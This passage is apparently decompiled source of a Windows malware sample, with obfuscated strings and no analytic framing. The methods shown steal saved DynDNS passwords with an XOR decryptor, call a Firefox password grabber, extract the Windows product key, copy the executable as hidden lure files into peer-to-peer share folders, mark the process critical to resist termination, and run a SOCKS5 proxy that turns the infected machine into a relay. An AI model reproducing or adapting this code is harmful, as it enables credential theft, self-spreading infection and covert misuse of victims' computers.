						if (Operators.CompareString(directoryInfo.get_Name(), GClass0.smethod_0("yŦɽ\u0375ѥՠ٩ݬࡦॲ"), false) != 0)
						{
							goto IL_0067;
						}
						goto IL_008b;
						end_IL_0000_2:
						break;
					}
					num = 9;
					obj = text;
					break;
					end_IL_0000:;
				}
				catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj2);
					try0000_dispatch = 230;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			object result = obj;
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public string dyndns_stealen()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			int num5 = default(int);
			string text = default(string);
			string text2 = default(string);
			string text3 = default(string);
			string[] array = default(string[]);
			string[] array2 = default(string[]);
			string text4 = default(string);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 409:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0017;
							case 4:
								goto IL_001c;
							case 5:
								goto IL_0027;
							case 6:
							case 7:
								goto IL_0049;
							case 8:
								goto IL_006e;
							case 9:
								goto IL_0089;
							case 10:
								goto IL_00a0;
							case 13:
								goto IL_00cc;
							case 14:
								goto IL_00fc;
							case 15:
								goto IL_0102;
							case 11:
							case 12:
								goto IL_010b;
							case 16:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 17:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_00fc:
						num5 = checked(num5 + 1);
						goto IL_0102;
						IL_00cc:
						num = 13;
						text = text + dyn_dns_PW_Decrypt(Strings.Split(text2, GClass0.smethod_0("Yũɴ\u0375Ѳիٱݦ࠼"), -1, (CompareMethod)0)[1]) + GClass0.smethod_0("=ĿȿͽЩտ");
						goto IL_00fc;
						IL_0009:
						num = 2;
						text = GClass0.smethod_0("Oųɧ\u034cщՕؾ\u073e࠸ए\u0a0b");
						goto IL_0017;
						IL_0017:
						num = 3;
						text3 = null;
						goto IL_001c;
						IL_001c:
						num = 4;
						if (!File.Exists(text3))
						{
							goto IL_0027;
						}
						goto IL_0049;
						IL_0027:
						num = 5;
						text3 = Interaction.Environ(GClass0.smethod_0("NłɁ\u0359јՏ\u065bݛࡗ\u0954\u0a4a\u0b42\u0c4aൎไ")) + GClass0.smethod_0("AŘɢʹѝՖل\u074aࡀ।\u0a77୳\u0c65൵\u0e7dདྷၮᅣብ፬ᑠᕯᘩᝢ\u187cᥪ\u1a67\u1b6cᱲ");
						goto IL_0049;
						IL_0049:
						num = 7;
						array = Strings.Split(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text3), GClass0.smethod_0("\u000fċ"), -1, (CompareMethod)0);
						goto IL_006e;
						IL_006e:
						num = 8;
						array2 = array;
						num5 = 0;
						goto IL_0077;
						IL_0077:
						if (num5 >= array2.Length)
						{
							break;
						}
						text2 = array2[num5];
						goto IL_0089;
						IL_0102:
						num = 15;
						goto IL_0077;
						IL_0089:
						num = 9;
						if (text2.Contains(GClass0.smethod_0("]ŴɣͷѪբٯݤ")))
						{
							goto IL_00a0;
						}
						goto IL_010b;
						IL_00a0:
						num = 10;
						text = text + Strings.Split(text2, GClass0.smethod_0("\\Żɢʹѫեٮݧ࠼"), -1, (CompareMethod)0)[1] + GClass0.smethod_0("8ĸȺ");
						goto IL_010b;
						IL_010b:
						num = 12;
						if (text2.Contains(GClass0.smethod_0("XŦɵͶѳլ\u0670ݥ")))
						{
							goto IL_00cc;
						}
						goto IL_00fc;
						end_IL_0000_2:
						break;
					}
					num = 16;
					text4 = text + GClass0.smethod_0("\u000fċ");
					break;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 409;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			string result = text4;
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		private string dyn_dns_PW_Decrypt(string passwort)
		{
			string text = null;
			int num = Strings.Len(passwort);
			checked
			{
				for (int i = 1; i <= num; i += 2)
				{
					text += Conversions.ToString(Strings.Chr((int)Math.Round(Conversion.Val(GClass0.smethod_0("$ŉ") + Strings.Mid(passwort, i, 2)))));
				}
				int num2 = Strings.Len(text);
				long num3 = default(long);
				for (int j = 1; j <= num2; j++)
				{
					StringType.MidStmtStr(ref text, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text, j, 1)) ^ Strings.Asc(Strings.Mid(GClass0.smethod_0("|ıɍͿќիفݩ"), (int)(num3 + 1L), 1)))));
					unchecked
					{
						num3 = checked(num3 + 1L) % 8L;
					}
				}
				return text;
			}
		}

		public object GetFireFoxPWs()
		{
			return ff.sFirefox();
		}

		public string GetProductKey()
		{
			checked
			{
				try
				{
					object objectValue = RuntimeHelpers.GetObjectValue(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱮᵋṂὒ⁰Ⅽ≲⍺⑯╆♎❱⡹⥲⩺⭣Ⱡⴲ\u2e5f⽄こㅍ㉸㍾㑹㕯㙧㝼㡑㥣㩷㭷㱪㵭㹯"), GClass0.smethod_0("TŦɩ\u0364Ѹժ٦ݙ\u087a२\u0a62୰౧൷\u0e4bཥ"), 0));
					if (objectValue == null)
					{
						return GClass0.smethod_0("Mĭɀ");
					}
					string text = GClass0.smethod_0("");
					int num = Information.LBound((Array)objectValue, 1);
					int num2 = Information.UBound((Array)objectValue, 1);
					for (int i = num; i <= num2; i++)
					{
						text = text + GClass0.smethod_0("!") + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
					}
					int num3 = 52;
					string[] array = new string[25]
					{
						GClass0.smethod_0("C"),
						GClass0.smethod_0("B"),
						GClass0.smethod_0("E"),
						GClass0.smethod_0("G"),
						GClass0.smethod_0("F"),
						GClass0.smethod_0("I"),
						GClass0.smethod_0("K"),
						GClass0.smethod_0("J"),
						GClass0.smethod_0("L"),
						GClass0.smethod_0("Q"),
						GClass0.smethod_0("P"),
						GClass0.smethod_0("S"),
						GClass0.smethod_0("U"),
						GClass0.smethod_0("W"),
						GClass0.smethod_0("V"),
						GClass0.smethod_0("Y"),
						GClass0.smethod_0("X"),
						GClass0.smethod_0("3"),
						GClass0.smethod_0("2"),
						GClass0.smethod_0("5"),
						GClass0.smethod_0("7"),
						GClass0.smethod_0("6"),
						GClass0.smethod_0("9"),
						GClass0.smethod_0("8"),
						null
					};
					int num4 = 29;
					int num5 = 15;
					string[] array2 = new string[16];
					string[] array3 = new string[31];
					string text2 = GClass0.smethod_0("");
					int num6 = 67;
					for (int j = 52; j <= num6; j++)
					{
						array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
						text2 = text2 + GClass0.smethod_0("!") + Conversion.Hex((object)array2[j - num3]);
					}
					string text3 = GClass0.smethod_0("");
					for (int k = num4 - 1; k >= 0; k += -1)
					{
						int num7;
						unchecked
						{
							if (checked(k + 1) % 6 == 0)
							{
								array3[k] = GClass0.smethod_0(",");
								text3 += GClass0.smethod_0(",");
								continue;
							}
							num7 = 0;
						}
						for (int l = num5 - 1; l >= 0; l += -1)
						{
							int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
							unchecked
							{
								array2[l] = Conversions.ToString(num8 / 24);
								num7 = num8 % 24;
							}
						}
						array3[k] = array[num7];
						text3 += array[num7];
					}
					return Strings.StrReverse(text3);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string result = GClass0.smethod_0("");
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}

	public class Spread
	{
		[DebuggerNonUserCode]
		public Spread()
		{
		}

		public static void P2pSpread()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0008;
					case 338:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0019;
							case 4:
								goto IL_002a;
							case 5:
								goto IL_003b;
							case 6:
								goto IL_004c;
							case 7:
								goto IL_005d;
							case 8:
								goto IL_006e;
							case 9:
								goto IL_007f;
							case 10:
								goto IL_0091;
							case 11:
								goto IL_00a3;
							case 12:
								goto IL_00b5;
							case 13:
								goto IL_00c7;
							case 14:
								goto IL_00d9;
							case 15:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 16:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_00d9:
						num = 14;
						SpreadP2P(GClass0.smethod_0("_ňɉ\u0339ыգٳݴ\u0879\u0943ੳ\u0b65\u0c73൧ฮང\u1062ᅸቾ፨ᑤᕫᙣ\u1777ᠪᥦ\u1a7a᭤"));
						break;
						IL_00c7:
						num = 13;
						SpreadP2P(GClass0.smethod_0("cĨȫ\u0338ЦԦإ\u0731࠳\u0944\u0a50\u0b53ఢ൛\u0e63ཨၮᅾቬ፫ᑳᕣᙡᜪᡦ\u197a\u1a64"));
						goto IL_00d9;
						IL_0008:
						num = 2;
						SpreadP2P(GClass0.smethod_0("gŀɜ\u0341шԋمݏࠈ॰\u0a47\u0b57\u0c47\u0d51ใཇၔᄿቖ፼ᑿᕰᘺᝉᡪ\u197e\u1a60᭴ᱠᴳṗή⁹ⅻ≧⍢③┫☺✧⠸⤩⨴⬰Ⱚⵦ\u2e7a⽤"));
						goto IL_0019;
						IL_0019:
						num = 3;
						SpreadP2P(GClass0.smethod_0("cŖɆ\u0347Ёղپݤࡧॹ੩ଷౘൻ\u0e74\u0f79\u1060ᅺቧጲᑒᕢᙪᝯ\u1879ᥣ\u1a79ᬪ᰻ᴦḷἨ‱K≦⍺⑤"));
						goto IL_002a;
						IL_002a:
						num = 4;
						SpreadP2P(GClass0.smethod_0("Fŧɽ\u0365ѳեذݜ\u086bॵ\u0a7c\u0b62౩ൽ\u0e7d\u0f75\u1063ᅶሪ፰ᑡᕳ"));
						goto IL_003b;
						IL_003b:
						num = 5;
						SpreadP2P(GClass0.smethod_0("kŴȆ\u0375ьՌ\u0656ݎࡓॷ\u0a71୭\u0c3cബ\u0e34༩\u1038ᅕታ፡ᑵᕅᙷᝣᡣᥦ\u1a61᭣\u1c2cᵈṸὨ\u206bⅬ≣⍡\u242a╦♺❤"));
						goto IL_004c;
						IL_004c:
						num = 6;
						SpreadP2P(GClass0.smethod_0("dŀɌ\u0340фտ\u065eݸࡩॹ੩\u0b45\u0c5cൾ\u0e71\u0f73ၶᅠበጲᑒᕃᘻᜮᡄᥢ\u1a78\u1b7eᱨᵤṫὣ⁷K≦⍺⑤"));
						goto IL_005d;
						IL_005d:
						num = 7;
						SpreadP2P(GClass0.smethod_0("aŻɱͿѹԻيݱ\u0877\u0963\u0a79୦౼ർ\u0e62༱ၓᅜሺጭᑉᕳᙾᝬᡦᥣ\u1a63᭡\u1c2aᵦṺὤ"));
						goto IL_006e;
						IL_006e:
						num = 8;
						SpreadP2P(GClass0.smethod_0("třɀ\u035aч\u0557كܝ\u087cग़\u0a5f\u0b45\u0c40൏ฉ\u0f7b၈ᅓ\u1257ፇᑆᔂᙣᝏᡱᥰ\u1a64᭔ᱴᵪḹὐ⁶ⅵ≾⌴␣┼☥✰⡭⥷⨭⭄ⱪ\u2d72⹑⽜ぢㅧ㉨㌪㑦㕺㙤"));
						goto IL_007f;
						IL_007f:
						num = 9;
						SpreadP2P(GClass0.smethod_0("qŃɑ\u0349ѻՍٵݽࡩॿਹ\u0b48\u0c65൳\u0e78\u0f7dၦᅿሱፘᑮᕭᙦᝩ\u1879\u192aᨹᬦ\u1c32ᴨḴἪ\u2066ⅺ≤"));
						goto IL_0091;
						IL_0091:
						num = 10;
						SpreadP2P(GClass0.smethod_0("MŰɶͳѹբ٧\u0733\u0825ऱ\u0a57ୠ\u0c62൩ฬཎၮᅠቼ፮ᑩᕫᘪᝦ\u187aᥤ"));
						goto IL_00a3;
						IL_00a3:
						num = 11;
						SpreadP2P(GClass0.smethod_0("RŸɠ\u034fѹՇ٧\u0733ࡆ\u0963\u0a7f\u0b65౯\u0d63ฬ\u0f48ၸᅬቩ፳ᑩᕷᘪᝠᡭᥬ"));
						goto IL_00b5;
						IL_00b5:
						num = 12;
						SpreadP2P(GClass0.smethod_0("^ťɳͰдՀ٦ݴ\u0871\u0962\u0a49୬ౡ൮\u0e79༩၀ᅦብ፮ᐪᕦᙺᝤ"));
						goto IL_00c7;
						end_IL_0000_2:
						break;
					}
					num = 15;
					SpreadP2P(GClass0.smethod_0("iŐɌ\u0301Ѩվٽݶ\u0879३\u0a3aବశത\u0e38༤\u1034ᅃበ፴ᑽᕦᙻᝠᠬᥝ\u1a6f᭻ᱻᵮṩὫ\u202aⅦ≺⍤"));
					break;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 338;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public static void SpreadP2P(string SpreadDateiName)
		{
			int try0000_dispatch = -1;
			int num = default(int);
			List<string> list = default(List<string>);
			int num2 = default(int);
			int num3 = default(int);
			string current = default(string);
			List<string>.Enumerator enumerator = default(List<string>.Enumerator);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						list = new List<string>();
						goto IL_0009;
					case 662:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0030;
							case 4:
								goto IL_0057;
							case 5:
								goto IL_007e;
							case 6:
								goto IL_00a5;
							case 7:
								goto IL_00cc;
							case 8:
								goto IL_00f3;
							case 9:
								goto IL_011a;
							case 10:
								goto IL_0142;
							case 11:
								goto IL_016a;
							case 12:
								goto IL_0192;
							case 13:
								goto IL_01ba;
							case 14:
								goto IL_01d6;
							case 15:
								goto IL_01de;
							case 16:
								goto IL_01f6;
							case 17:
								goto IL_020b;
							case 18:
							case 19:
								goto IL_021c;
							default:
								goto end_IL_0000;
							case 20:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_020b:
						num = 17;
						File.SetAttributes(current + SpreadDateiName, FileAttributes.Hidden);
						goto IL_021c;
						IL_01f6:
						num = 16;
						File.Copy(Application.get_ExecutablePath(), current + SpreadDateiName);
						goto IL_020b;
						IL_0009:
						num = 2;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("MŜɦ\u0363Ѩ՛٢ݸ\u086c\u0954\u0a54୮\u0c64൶\u0e66སၝ"));
						goto IL_0030;
						IL_0030:
						num = 3;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("JŰɐͼѼպٵݶ࠼ऽ\u0a3c\u0b3b\u0c56ൠ\u0e66ཤ\u1069ᅨቭ፭ᑥᕝ"));
						goto IL_0057;
						IL_0057:
						num = 4;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("Dżɷ\u036fѵղ\u064eݼࡩय\u0a7d\u0b65౭൹\u0e6f\u0f6dဨᅡቩ፩ᑠᕦᙰ\u175d"));
						goto IL_007e;
						IL_007e:
						num = 5;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("Aŷɺ\u0360Ѹչطݺ\u087cॠ੶\u0b4e౼൩ฯ\u0f7dၥᅭቹ፯ᑭᔨᙡᝩᡩᥠ\u1a66\u1b70ᱝ"));
						goto IL_00a5;
						IL_00a5:
						num = 6;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("}ŋɾ\u0364Ѽսػݶ\u0870६ੲଶ౾\u0d3f\u0e38ཎၼᅩሯ\u137dᑥᕭᙹᝯᡭ\u1928\u1a61᭩ᱩᵠṦὰ⁝"));
						goto IL_00cc;
						IL_00cc:
						num = 7;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("JŲɦͼѹբ٤ݪ\u087c\u0951\u0a61୲ప൮\u0e7aཨ\u106dᅶተ፦ᑰᕝ"));
						goto IL_00f3;
						IL_00f3:
						num = 8;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("LŪɣ\u0378Ѡծ\u0656ݠࡦ।੩୨౭൭\u0e65ཝ"));
						goto IL_011a;
						IL_011a:
						num = 9;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("Gŷɶ\u036aѧվ\u0670ݡࡠ\u094e\u0a7c୩యൽ\u0e65\u0f6dၹᅯቭጨᑡᕩᙩᝠᡦᥰ\u1a5d"));
						goto IL_0142;
						IL_0142:
						num = 10;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("JŲɦͼѹբ٤ݪ\u087c\u0951\u0a61୲ప൮\u0e7aཨ\u106dᅶተ፦ᑰᕝ"));
						goto IL_016a;
						IL_016a:
						num = 11;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("QŸɮ\u0379ѥթ\u065bݠ\u086c२੦ୱ\u0c5d"));
						goto IL_0192;
						IL_0192:
						num = 12;
						list.Add(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("Rźɥ\u0365ѧձ\u0654ݴ\u086e।੶୦౦൝"));
						goto IL_01ba;
						IL_01ba:
						num = 13;
						enumerator = list.GetEnumerator();
						goto IL_01c5;
						IL_01c5:
						if (enumerator.MoveNext())
						{
							current = enumerator.Current;
							goto IL_01d6;
						}
						((IDisposable)enumerator).Dispose();
						goto end_IL_0000_2;
						IL_021c:
						num = 19;
						goto IL_01c5;
						IL_01d6:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_01de;
						IL_01de:
						num = 15;
						if (Operators.CompareString(current, GClass0.smethod_0(""), false) != 0)
						{
							goto IL_01f6;
						}
						goto IL_021c;
						end_IL_0000:
						break;
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 662;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_2:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}

	public class cProtect
	{
		private struct LUID
		{
			public uint LowPart;

			public int HighPart;
		}

		private struct LUID_AND_ATTRIBUTES
		{
			public LUID Luid;

			public uint Attributes;
		}

		private struct TOKEN_PRIVILEGES
		{
			public uint PrivilegeCount;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
			public LUID_AND_ATTRIBUTES[] Privileges;
		}

		private const uint TOKEN_QUERY = 8u;

		private const uint TOKEN_ADJUST_PRIVILEGES = 32u;

		private const string SE_DEBUG_NAME = "SeDebugPrivilege";

		private const uint SE_PRIVILEGE_ENABLED = 2u;

		private const int ANYSIZE_ARRAY = 1;

		private const int iBreakTermination = 29;

		[DebuggerNonUserCode]
		public cProtect()
		{
		}

		public void ProtectProcess(bool bProtect)
		{
			IntPtr currentProcess = GetCurrentProcess();
			GetPrivilegs(GClass0.smethod_0("CŪɊ\u0368Ѯվ٭ݙ\u087a८\u0a70୬౨൦\u0e65ཤ"));
			IntPtr intPtr = IntPtr.Zero;
			if (bProtect)
			{
				intPtr = new IntPtr(29);
			}
			IntPtr processInformation = new IntPtr(VarPtr(intPtr));
			NtSetInformationProcess(currentProcess, 29, processInformation, Marshal.SizeOf((object)(nint)intPtr));
		}

		private bool GetPrivilegs(string sPrivileg)
		{
			IntPtr currentProcess = GetCurrentProcess();
			LUID lUID = default(LUID);
			TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
			TOKEN_PRIVILEGES PreviousState = default(TOKEN_PRIVILEGES);
			IntPtr tokenHandle = default(IntPtr);
			if (!OpenProcessToken(currentProcess, 40u, tokenHandle))
			{
				return false;
			}
			if (!LookupPrivilegeValue(string.Empty, sPrivileg, lUID))
			{
				return false;
			}
			NewState.Privileges = new LUID_AND_ATTRIBUTES[1];
			NewState.PrivilegeCount = 1u;
			NewState.Privileges[0].Attributes = 2u;
			NewState.Privileges[0].Luid = lUID;
			return AdjustTokenPrivileges(tokenHandle, DisableAllPrivileges: false, ref NewState, Marshal.SizeOf((object)NewState), ref PreviousState, 0u);
		}

		private int VarPtr(object o)
		{
			return GCHandle.Alloc(RuntimeHelpers.GetObjectValue(o), GCHandleType.Pinned).AddrOfPinnedObject().ToInt32();
		}

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentProcess();

		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, IntPtr TokenHandle);

		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, LUID lpLuid);

		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, uint ReturnLengthInBytes);

		[DllImport("ntdll.dll")]
		private static extern IntPtr NtSetInformationProcess([In] IntPtr ProcessHandle, [In] int ProcessInformationClass, [In] IntPtr ProcessInformation, [In] int ProcessInformationLength);
	}

	public class Getcn
	{
		private const uint LOCALE_SYSTEM_DEFAULT = 1024u;

		private const uint LOCALE_SENGCOUNTRY = 4098u;

		[DebuggerNonUserCode]
		public Getcn()
		{
		}

		[DllImport("kernel32.dll")]
		private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);

		private static string GetInfo(uint lInfo)
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			int localeInfo = GetLocaleInfo(1024u, lInfo, stringBuilder, stringBuilder.Capacity);
			if (localeInfo > 0)
			{
				return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
			}
			return string.Empty;
		}

		public static object GetLetters()
		{
			return GetInfo(4098u);
		}
	}

	public class Socks5Handler
	{
		public delegate void SendTextEventHandler(string sText);

		private SendTextEventHandler SendTextEvent;

		public List<Socks5> Socks5List;

		public event SendTextEventHandler SendText
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				SendTextEvent = (SendTextEventHandler)Delegate.Combine(SendTextEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				SendTextEvent = (SendTextEventHandler)Delegate.Remove(SendTextEvent, value);
			}
		}

		public Socks5Handler()
		{
			Socks5List = new List<Socks5>();
		}

		public void NewSocks5(int Port)
		{
			try
			{
				TcpListener tcpListener = new TcpListener(Port);
				tcpListener.Start();
				SendTextEvent?.Invoke(GClass0.smethod_0("{ňɅ\u034eїԖ\u0602ݲࡅ७੨\u0b78౮\u0d3b\u0e76\u0f78\u106dᅤት\u137dᑠᔳᙼᝤ\u187e\u192f\u1a6f᭸ᱪᴫṮὬ\u2065℧≖⍪⑶╷☸✡") + Conversions.ToString(Port));
				while (true)
				{
					Socks5 socks = new Socks5(tcpListener.AcceptTcpClient());
					Thread thread = new Thread(socks.Work);
					thread.Start();
					Socks5List.Add(socks);
					SendTextEvent?.Invoke(GClass0.smethod_0("gōɒ\u0343Ѕղنݐࡃ\u0949\u0a71\u0b7a౨൲\u0e7c༺ၸᅭቱ፱ᑰᕶᙲᝧᡥ\u193cᨯ\u1b6fᱸᵪḫὮ\u206cⅥ∧⍖⑪╶♷✸⠡") + Conversions.ToString(Port));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				SendTextEvent?.Invoke(GClass0.smethod_0("MŲɿͰѩԬظ\u0744\u0873१\u0a62୶ౠറ\u0e79\u0f7cၺᄭቩ፩ᑭᕬᙻ\u1773\u18fa\u1977\u1a7e᭷\u1c38ᴡ") + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}

		public void DeleteAllSocks5Server()
		{
			foreach (Socks5 socks in Socks5List)
			{
				try
				{
					socks.socksClient.Close();
					socks.serverClient.Close();
					SendTextEvent?.Invoke(GClass0.smethod_0("LűɾͷѨԯعݎ\u0872।\u0a77\u0b7d౽൶\u0e64\u0f7e\u1068ᄮቸ።ᑿᕯᙻᝪᡵᥩ\u1a66\u1b6cᱦᵬḯ"));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public class Socks5
	{
		public TcpClient socksClient;

		public TcpClient serverClient;

		private byte SOCKS_VERSION;

		private byte SOCKS_NOAUTH;

		private byte SOCKS_REPLYSUCCESS;

		private byte SOCKS_IPV4ADDR;

		private byte SOCKS_DNSNAME;

		public bool Online;

		public Socks5(TcpClient client)
		{
			SOCKS_VERSION = 5;
			SOCKS_NOAUTH = 0;
			SOCKS_REPLYSUCCESS = 0;
			SOCKS_IPV4ADDR = 1;
			SOCKS_DNSNAME = 3;
			Online = false;
			socksClient = client;
		}

		public void Work()
		{
			checked
			{
				try
				{
					NetworkStream stream = socksClient.GetStream();
					byte[] array = new byte[2];
					stream.Read(array, 0, 2);
					byte[] array2 = new byte[unchecked((int)array[1]) - 1 + 1];
					stream.Read(array2, 0, array2.Length);
					byte[] buffer = new byte[2] { SOCKS_VERSION, SOCKS_NOAUTH };
					stream.Write(buffer, 0, 2);
					byte[] array3 = new byte[4];
					stream.Read(array3, 0, 4);
					string text = GClass0.smethod_0("");
					if (array3[3] == SOCKS_IPV4ADDR)
					{
						byte[] array4 = new byte[4];
						stream.Read(array4, 0, 4);
						IPAddress iPAddress = new IPAddress(array4);
						text = iPAddress.ToString();
					}
					else if (array3[3] == SOCKS_DNSNAME)
					{
						byte[] array5 = new byte[1];
						stream.Read(array5, 0, 1);
						byte[] array6 = new byte[unchecked((int)array5[0]) - 1 + 1];
						stream.Read(array6, 0, array5[0]);
						text = Encoding.Default.GetString(array6);
					}
					if (Operators.CompareString(text, GClass0.smethod_0(""), false) == 0)
					{
						return;
					}
					byte[] array7 = new byte[2];
					stream.Read(array7, 0, 2);
					int port = BitConverter.ToUInt16(new byte[2]
					{
						array7[1],
						array7[0]
					}, 0);
					serverClient = new TcpClient(text, port);
					if (!serverClient.Connected)
					{
						return;
					}
					byte[] array8 = new byte[10] { SOCKS_VERSION, SOCKS_REPLYSUCCESS, 0, 1, 0, 0, 0, 0, 0, 0 };
					string ipString = serverClient.Client.LocalEndPoint!.ToString()!.Split(new char[1] { ':' })[0];
					IPAddress iPAddress2 = IPAddress.Parse(ipString);
					array8[4] = iPAddress2.GetAddressBytes()[0];
					array8[5] = iPAddress2.GetAddressBytes()[1];
					array8[6] = iPAddress2.GetAddressBytes()[2];
					array8[7] = iPAddress2.GetAddressBytes()[3];
					ushort value = ushort.Parse(serverClient.Client.LocalEndPoint!.ToString()!.Split(new char[1] { ':' })[1]);
					array8[8] = BitConverter.GetBytes(value)[0];
					array8[9] = BitConverter.GetBytes(value)[1];
					stream.Write(array8, 0, 10);
					NetworkStream stream2 = serverClient.GetStream();
					bool flag = false;
					while (serverClient.Connected && socksClient.Connected && !flag)
					{
						Thread.Sleep(100);
						try
						{
							if (stream.DataAvailable)
							{
								byte[] array9 = new byte[10000];
								int num = stream.Read(array9, 0, 10000);
								byte[] array10 = new byte[num - 1 + 1];
								Array.Copy(array9, array10, num);
								stream2.Write(array10, 0, array10.Length);
							}
